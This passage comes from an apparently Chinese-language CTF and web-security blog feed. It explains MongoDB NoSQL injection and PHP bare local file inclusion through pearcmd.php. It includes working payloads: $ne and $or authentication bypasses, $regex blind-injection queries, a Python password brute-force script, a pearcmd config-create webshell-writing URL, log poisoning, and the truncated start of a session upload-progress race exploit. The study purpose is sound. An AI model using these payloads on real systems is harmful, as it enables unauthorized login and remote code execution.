class="token string">"admin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"age"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// update三个参数，name、age、选项</span><span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeBulkWrite</span><span class="token punctuation">(</span><span class="token string">'atmujie.mujie'</span><span class="token punctuation">,</span><span class="token variable">$mongoUpdate</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 查询数据【查】</span><span class="token variable">$mongoQueery</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 查询条件,相当于find()方法,[]表示查询全部</span><span class="token variable">$queryResult</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string">'atmujie.mujie'</span><span class="token punctuation">,</span><span class="token variable">$mongoQueery</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 执行查询</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$queryResult</span> <span class="token keyword">as</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$json</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//    print_r($res); // 输出数据</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h1><p>nosql的本质就是注入，所以注入的方法和mysql并没有什么区别，只是语法不同所以注入的技巧不同</p><h2 id="永真式"><a href="#永真式" class="headerlink" title="永真式"></a>永真式</h2><p>其他文章也叫他重言式，我感觉永真顺口，就叫永真了</p><p>简单来说就是传入条件判断符，使查询条件永远伪真</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">const</span> <span class="token constant">TEXT</span> <span class="token operator">=</span> <span class="token string">'atmujie.mujie'</span><span class="token punctuation">;</span><span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$这是用户输入 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"username"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"admin"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span>$这是用户输入<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token constant">TEXT</span><span class="token punctuation">,</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token keyword">as</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211110165831951.png" alt="image-20211110165831951"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">const</span> <span class="token constant">TEXT</span> <span class="token operator">=</span> <span class="token string">'atmujie.mujie'</span><span class="token punctuation">;</span><span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$这是恶意输入 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"username"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">'$ne'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span>$这是恶意输入<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token constant">TEXT</span><span class="token punctuation">,</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token keyword">as</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211110170213507.png" alt="image-20211110170213507"></p><p>所谓永真/重言，就是这样</p><h3 id="永真进阶"><a href="#永真进阶" class="headerlink" title="永真进阶"></a>永真进阶</h3><p>这部分先知社区称为联合查询，但我认为这仍然算是永真，联合查询或许可以达成，但不是这种</p><p>+++</p><p><img src="image-20211111104345099.png" alt="image-20211111104345099"></p><p>+++</p><p>上面是先知的讲解，但这种构造思路只在php7以下起效，php7版本要求查询语句的错误更为明显</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">const</span> <span class="token constant">TEXT</span> <span class="token operator">=</span> <span class="token string">'atmujie.mujie'</span><span class="token punctuation">;</span><span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$这是用户输入 <span class="token operator">=</span> <span class="token string">"{\"username\":\""</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"\",\"password\":\""</span><span class="token punctuation">.</span><span class="token variable">$password</span><span class="token punctuation">.</span><span class="token string">"\"}"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>$这是用户输入<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token constant">TEXT</span><span class="token punctuation">,</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token keyword">as</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果代码如上所示，很容易产生nosql注入</p><pre class="line-numbers language-payload"><code class="language-payload">username=admin","$or":[{},{"a":"a&password=}],"$comment":"111&password=admi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20211111111409161.png" alt="image-20211111111409161"></p><h2 id="js代码注入"><a href="#js代码注入" class="headerlink" title="js代码注入"></a>js代码注入</h2><p>这里我也不是很熟悉，主要是不会js,所以这里只能简单的写一写原理</p><p>在 MongoDB 中，<code>$where</code> 操作符可以用来执行 JavaScript 代码</p><pre class="line-numbers language-mongo"><code class="language-mongo">db.users.find({ $where: "function(){return(this.username == 'whoami')}" }){ "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "whoami", "password" : "657260" }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用$where关键字执行js代码，这里相当于执行了<code>db.users.find(&#123;&quot;username&quot;:&quot;whoami&quot;&#125;)</code></p><p>这里几乎可以做到js做的到的所有事情</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p><strong>MongoDB 使用 $regex 操作符来设置匹配字符串的正则表达式。</strong></p><p>MongoDB使用PCRE (Perl Compatible Regular Expression) 作为正则表达式语言。</p><p>语法：</p><pre class="line-numbers language-mongo"><code class="language-mongo">db.mujie.find({name:{$regex:"mujie"}})db.mujie.find({name:/mujie/})<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20211111183622819.png" alt="image-20211111183622819"></p><pre class="line-numbers language-pay;oad"><code class="language-pay;oad">// 判断字符数db.mujie.find({username:"Atmujie",password:{$regex:".{1}"}})// 注意，$regex只能匹配字符串类型// 盲注db.mujie.find({username:"Atmujie",password:{$regex:"1.{5}"}})<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211111184916911.png" alt="image-20211111184916911"></p><p><img src="image-20211111185037298.png" alt="image-20211111185037298"></p><p>+++</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 简单的盲注脚本，出自先知社区</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringpassword <span class="token operator">=</span> <span class="token string">''</span>url <span class="token operator">=</span> <span class="token string">'http://192.168.226.148/index.php'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>        <span class="token keyword">if</span> c <span class="token operator">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># When the method is GET</span>            get_payload <span class="token operator">=</span> <span class="token string">'?username=admin&amp;password[$regex]=^%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>password <span class="token operator">+</span> c<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># When the method is POST</span>            post_payload <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>                <span class="token string">"password[$regex]"</span><span class="token punctuation">:</span> <span class="token string">'^'</span> <span class="token operator">+</span> password <span class="token operator">+</span> c            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true"># When the method is POST with JSON</span>            json_payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""{"username":"admin", "password":{"$regex":"^%s"}}"""</span> <span class="token operator">%</span> <span class="token punctuation">(</span>password <span class="token operator">+</span> c<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#headers = {'Content-Type': 'application/json'}</span>            <span class="token comment" spellcheck="true">#r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_payload<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'Login Success'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>password <span class="token operator">+</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span>                password <span class="token operator">+=</span> c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大体道这里就算是完成入门了，剩下的也只有自己找题练习</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>菜鸟随笔-PHP裸文件本地包含</title>
      <link href="/2021/11/02/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/"/>
      <url>/2021/11/02/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<p>对这个知识点的思考起源于前两天打的两场CTF,题目源码如下</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"dir"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^cool]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You are not cool!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data|fl|input|read/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;p> error! &lt;/p>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>                <span class="token function">var_dump</span><span class="token punctuation">(</span>@<span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题我遇到了两次，也两次都不会做，直到昨天我看p牛发了新文章</p><p><code>https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</code></p><p>虽说我觉得预期解不一定是这样的</p><p>大家有什么其他方法可以给我留言说一下</p><h1 id="对PHP裸文件本地包含的理解"><a href="#对PHP裸文件本地包含的理解" class="headerlink" title="对PHP裸文件本地包含的理解"></a>对PHP裸文件本地包含的理解</h1><p>p牛在讲这片文章事前置了很多的知识，不过多数其实是对这个利用点的引出</p><p>所以我这里先说结论</p><h2 id="一、pearcmd-php"><a href="#一、pearcmd-php" class="headerlink" title="一、pearcmd.php"></a>一、pearcmd.php</h2><p>这个点主要是使用了pearcmd.php这个pecl/pear中的文件。</p><p>PEAR  PHP扩展和应用程序存储库（PHP Extension and Application Repository）是可重用PHP组件的框架和分发系统。</p><p>PECL（PHP扩展社区库）是PHP扩展的存储库，提供了所有已知扩展的目录和托管设施，用于下载和开发PHP扩展。</p><p>++++</p><p><img src="image-20211102152437786.png" alt="image-20211102152437786"></p><p>+++</p><p>关于这个点p牛也说得很清楚</p><p>我主要关注后一段，docker任意版本都会默认安装，要知道现在的CTF几乎所有的Web题目都是搭建在docker中的，这意味着只要CTF存在文件包含，这一点就可以利用，堪称通杀</p><h2 id="二、register-argc-argv配置"><a href="#二、register-argc-argv配置" class="headerlink" title="二、register_argc_argv配置"></a>二、register_argc_argv配置</h2><p>第二个点同样在docker中默认开启，当然真实环境中默认关闭</p><blockquote><p>docker</p><p><img src="image-20211102153220763.png" alt="image-20211102153220763"></p></blockquote><blockquote><p>真实环境，我这里是phpstudy,php7.3.4</p><p><img src="image-20211102153157136.png" alt="image-20211102153157136"></p></blockquote><p><strong>当这个选项开启后，用户的query-string将赋值给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</strong></p><p>这个部分我也并不是很懂，所以只能给出一个简单的结论：我们GET传入的值h会被当作一个命令行参数，比如</p><pre class="line-numbers language-payload"><code class="language-payload">http://127.0.0.1/index.php?test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的test没有任意的意义，但会当作命令行参数</p><p><img src="image-20211102214356468.png" alt="image-20211102214356468"></p><p>将这两个点结合起来，所谓裸文件包含漏洞就产生了</p><p>第一点中pear会获取命令行argv参数执行，第二点可以将可控参数写入argv</p><p>为什么叫裸文件，因为docker下搭建的php默认开启了这两个配置，所以在出题人没有改的情况下，只需要有文件包含就可以利用</p><p>+++</p><p>pearcmd.php的所有命令</p><p><img src="5b0b1d97-f739-4d67-b98b-82a6d889bd2c.png" alt="img"></p><p>+++</p><p>其中我们使用的是config-create命令</p><p>这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p><h2 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h2><p>文章开始的那道题，就是这个的漏洞的典型例子</p><p><img src="image-20211102160000541.png" alt="image-20211102160000541"></p><p>用这个漏洞，上面的waf就不用管了</p><p>条件：存在file和dir，过正则</p><pre class="line-numbers language-payload"><code class="language-payload">/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/aaa.php&dir=. <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211102212640566.png" alt="image-20211102212640566"></p><p>这里要注意两个问题</p><p>1、不能用hackbar直接上传payload而是需要先burp抓包再上传</p><ul><li><p>直接上传会导致&lt;&gt;被编码，php代码无法执行</p><p>  <img src="image-20211102212832127.png" alt="image-20211102212832127"></p></li></ul><p>2、访问时应该是<code>?file=/tmp/aaa.php%26dir%3D.&amp;dir=.</code></p><ul><li><p>在payload上传时，必须存在dir参数，但argv会将两个参数完整的保存下来，导致我们的文件名变成<code>/tmp/cmd1.php%00&amp;dir=.</code></p><p>  <img src="image-20211102213112332.png" alt="image-20211102213112332"></p><p>  所以访问时要先将dir=. 进行url编码，然后再去访问</p></li></ul><p><img src="image-20211102213243288.png" alt="image-20211102213243288"></p><p>如果觉得这样很麻烦或者无法理解，可以将payload改成如下形式</p><pre class="line-numbers language-payload"><code class="language-payload">index.php?dir=.&+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/ffff.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样保存的文件名就是/tmp/ffff.php</p><p><img src="image-20211102213705959.png" alt="image-20211102213705959"></p><blockquote><p>理解payload</p><p>1、payload首先利用register的机制，将整个payload写入了argv</p><p>2、file是题目代码中对文件包含的引用，也就是包含了/usr/local/lib/ogo/pearcmd.php这个文件</p><p>执行顺序</p><p>1、写入payload至argv</p><p>2、包含pearcmd.php</p><p>3、pearcmd.php读取argv</p><p>此时dir=.无效，config-create被匹配为命令</p><p>命令以空格为分割（加号）</p><p>所以<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;</code>成为了第一个参数，/tmp/ffff.php为第二个参数</p><p>phpinfo()被写入/tmp/fff.php</p></blockquote><h1 id="对前置引用知识点的理解"><a href="#对前置引用知识点的理解" class="headerlink" title="对前置引用知识点的理解"></a>对前置引用知识点的理解</h1><p>主菜我放前面啃完了，可按我的一贯原则，前缀既然提到了这些“副菜”,那我肯定不会放过</p><p>所以现在来从头啃前置的知识点</p><p>学习的过程其实很有趣，痛苦的永远是仔细学完后却用不出来，WEB这点到真不如开发</p><p>学完就能用的感觉，真的就很快乐</p><h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><p>上面说了点废话，这里再说点</p><p>虽然这篇文章是参考p牛，但我并不打算向p牛一样从前置一直写到最终目的。我会将所有的知识来拆开写</p><p>言归正传</p><p>日志包含参考文章：<code>https://blog.csdn.net/weixin_45785288/article/details/109730830</code></p><p><strong>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。</strong></p><p>在docker中有所不同，docker会将日志重定向到stdout和stderr发送到真实设备</p><p>所以docker一般无法通过日志包含getshell</p><blockquote><p>apache的日志文件会记录每次访问的响应信息和url请求数据</p><p>用户对apache日志有访问权限</p><p>这样就会产生日志包含漏洞</p></blockquote><p>我们可以直接写入不存在的请求，如</p><pre class="line-numbers language-payload"><code class="language-payload">index.php/<?php phpinfo();?><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211103092918605.png" alt="image-20211103092918605"></p><p>在有权限读取日志文件的情况下，可以文件包含</p><p>日志文件目录格式</p><pre class="line-numbers language-flie"><code class="language-flie">// web应用日志在Linux系统的格式基本统一/var/log/[Web应用服务名称]/access.log例如：/var/log/apache2/access.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="phpinfo有趣的使用方式"><a href="#phpinfo有趣的使用方式" class="headerlink" title="phpinfo有趣的使用方式"></a>phpinfo有趣的使用方式</h2><p>第二个点p牛讲的是关于临时文件包含和phpinfo的作用，但我觉得临时文件我们已经很熟悉了，这里直接写写phpinfo的利用方式</p><p>在此之前，我对phpinfo的认识只停留在查看开启的服务，禁用的函数上</p><p><strong>phpinfo页面中会输出本次请求的所有信息</strong></p><p>如果上传文件，也会显示文件名，比如：</p><p><img src="image-20211103142302619.png" alt="image-20211103142302619"></p><p>得到了临时文件名</p><p>在phpinfo页面做的操作都会在phpinfo中显示，相当于小型debug了</p><h2 id="Windows通配符"><a href="#Windows通配符" class="headerlink" title="Windows通配符"></a>Windows通配符</h2><p>Linux系统的通配符在之前就学习过，windows的通配符还是第一次遇到，所以简单写一下</p><p><strong>PHP在读取Windows文件时，会使用到<a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfileexw">FindFirstFileExW</a>这个Win32 API来查找文件，而这个API是支持使用通配符的</strong></p><p>++++</p><p><img src="image-20211103145727849.png" alt="image-20211103145727849"></p><p>+++</p><h2 id="session-upload-progress与Session文件包含"><a href="#session-upload-progress与Session文件包含" class="headerlink" title="session.upload_progress与Session文件包含"></a>session.upload_progress与Session文件包含</h2><p>PHP中可以通过session progress功能实现临时文件的写入。</p><p>条件：</p><ul><li>目标环境开启了 session.upload_progress.enable 选项</li><li>目标环境关闭了 session.upload_progress.cleanup 选项</li><li>发送一个文件上传请求，其中包含一个文件表单和一个名字是<code>PHP_SESSION_UPLOAD_PROGRESS</code>的字段</li><li>请求的Cookie中包含Session ID</li></ul><p>原理:</p><blockquote><p>当session.upload_progress.enable开启时，php会将用户上传的文件星系保存在Session中</p><p>php中Session默认保存在文件里</p><p>如果session.upload_progress.cleanup开启，那么php上传请求读取完成后Session会被自动情路，导致无法读取Session</p></blockquote><p><img src="image-20211103163257652.png" alt="image-20211103163257652"></p><p>+++</p><p>exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> requests<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor<span class="token punctuation">,</span> waittarget <span class="token operator">=</span> <span class="token string">'http://192.168.1.162:8080/index.php'</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'helloworld'</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span>e<span class="token punctuation">:</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">)</span><span class="token punctuation">:</span>    files <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'load.png'</span><span class="token punctuation">,</span> b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">40960</span><span class="token punctuation">,</span> <span class="token string">'image/png'</span><span class="token 